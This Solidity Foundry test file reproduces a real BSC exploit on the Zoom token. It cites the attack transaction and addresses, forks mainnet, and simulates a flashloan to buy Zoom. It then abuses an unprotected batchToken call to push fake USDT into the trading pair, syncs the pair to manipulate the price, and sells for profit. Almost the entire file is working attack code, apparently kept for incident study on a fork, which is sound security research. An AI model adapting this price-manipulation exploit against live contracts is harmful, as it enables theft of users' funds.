// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./interface.sol";

// Exploit Alert ref: https://twitter.com/blocksecteam/status/1567027459207606273?s=21&t=ZNoZgSdAuI4dJIFlMaTJeg
// Origin Attack Transaction: 0xe176bd9cfefd40dc03508e91d856bd1fe72ffc1e9260cd63502db68962b4de1a
// Blocksec Txinfo: https://tools.blocksec.com/tx/bsc/0xe176bd9cfefd40dc03508e91d856bd1fe72ffc1e9260cd63502db68962b4de1a

// Attack Addr: 0xc578d755cd56255d3ff6e92e1b6371ba945e3984
// Attack Contract: 0xb8d700f30d93fab242429245e892600dcc03935d

// A contract which could send tokens to other contracts.
interface TokenController {
    function batchToken(
        address[] calldata _addr,
        uint256[] calldata _num,
        address token
    ) external;
}

// A contract which could buy/sell USDT and Zoom.
interface TokenTrader {
    function buy(uint256) external;

    function sell(uint256) external;
}

contract ContractTest is Test {
    TokenController Controller =
        TokenController(0x47391071824569F29381DFEaf2f1b47A4004933B);

    TokenTrader Trader =
        TokenTrader(0x5a9846062524631C01ec11684539623DAb1Fae58);

    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 Zoom = IERC20(0x9CE084C378B3E65A164aeba12015ef3881E0F853);

    // Fake USDT
    IERC20 FUSDT = IERC20(0x62D51AACb079e882b1cb7877438de485Cba0dD3f);

    // FakeUSDT-Zoom pair
    Uni_Pair_V2 Pair = Uni_Pair_V2(0x1c7ecBfc48eD0B34AAd4a9F338050685E66235C5);

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    uint256 flashloanAmount = 300000 * 10e18;
    uint256 paybackAmount = (flashloanAmount * 1000) / (1000 - 3);

    function setUp() public {
        cheats.createSelectFork("bsc", 21055930);
        cheats.label(address(USDT), "USDT");
        cheats.label(address(Zoom), "Zoom");
        cheats.label(address(FUSDT), "FUSDT");
        cheats.label(address(Controller), "Controller");
        cheats.label(address(Pair), "Pair");
        cheats.label(address(Trader), "Trader");
    }

    function print(string memory tips) public {
        emit log_string(tips);
        emit log_named_decimal_uint(
            "Attacker FUSDT balance",
            FUSDT.balanceOf(address(this)),
            FUSDT.decimals()
        );
        emit log_named_decimal_uint(
            "Attacker USDT balance",
            USDT.balanceOf(address(this)),
            USDT.decimals()
        );
        emit log_named_decimal_uint(
            "Attacker Zoom balance",
            Zoom.balanceOf(address(this)),
            Zoom.decimals()
        );
        emit log_named_decimal_uint(
            "Pair FUSDT balance",
            FUSDT.balanceOf(address(Pair)),
            FUSDT.decimals()
        );
        emit log_named_decimal_uint(
            "Pair USDT balance",
            USDT.balanceOf(address(Pair)),
            USDT.decimals()
        );
        emit log_named_decimal_uint(
            "Pair Zoom balance",
            Zoom.balanceOf(address(Pair)),
            Zoom.decimals()
        );
        emit log_named_decimal_uint(
            "Controller FUSDT balance",
            FUSDT.balanceOf(address(Controller)),
            FUSDT.decimals()
        );
        emit log_named_decimal_uint(
            "Controller USDT balance",
            USDT.balanceOf(address(Controller)),
            USDT.decimals()
        );
        emit log_named_decimal_uint(
            "Controller Zoom balance",
            Zoom.balanceOf(address(Controller)),
            Zoom.decimals()
        );
        emit log_named_decimal_uint(
            "Trader FUSDT balance",
            FUSDT.balanceOf(address(Trader)),
            FUSDT.decimals()
        );
        emit log_named_decimal_uint(
            "Trader USDT balance",
            USDT.balanceOf(address(Trader)),
            USDT.decimals()
        );
        emit log_named_decimal_uint(
            "Trader Zoom balance",
            Zoom.balanceOf(address(Trader)),
            Zoom.decimals()
        );
        emit log_named_decimal_uint(
            "Holder FUSDT balance",
            FUSDT.balanceOf(address(0xf72Fd2A9cDF1DB6d000A6181655e0F072fc47208)),
            FUSDT.decimals()
        );
        emit log_named_decimal_uint(
            "Holder USDT balance",
            USDT.balanceOf(address(0xf72Fd2A9cDF1DB6d000A6181655e0F072fc47208)),
            USDT.decimals()
        );
        emit log_named_decimal_uint(
            "Holder Zoom balance",
            Zoom.balanceOf(address(0xf72Fd2A9cDF1DB6d000A6181655e0F072fc47208)),
            Zoom.decimals()
        );
        emit log_string("");
    }

    function testExploit() public {
        print("Before exploit: ");
        // Prepare tokens
        prepareAction();
        print("After prepare: ");
        // Manipulation exploit
        exploitAction();
        print("After exploit: ");
        // Payback flashloan
        postAction();
        print("After post: ");
    }

    function prepareAction() internal {
        // Step 1, mock to flashlon USDT
        deal(address(USDT), address(this), flashloanAmount);
        // Step 2, approve
        USDT.approve(address(Trader), type(uint).max);
        // Step 3, swap USDT to Zoom
        Trader.buy(USDT.balanceOf(address(this)));
    }

    function exploitAction() internal {
        // Step 4, add tokens to uniswap pair.
        address[] memory n1 = new address[](1);
        n1[0] = address(Pair);
        uint256[] memory n2 = new uint256[](1);
        n2[0] = 1000000 ether;
        Controller.batchToken(n1, n2, address(FUSDT));

        // Step 5, sync
        Pair.sync();
    }

    function postAction() internal {
        // Step 6, approve
        Zoom.approve(address(Trader), type(uint).max);

        // Step 7, sell zoom tokens
        Trader.sell(Zoom.balanceOf(address(this)));

        // Step 8, mock to payback flashloan
        USDT.transfer(address(0xdead), paybackAmount);
    }
}
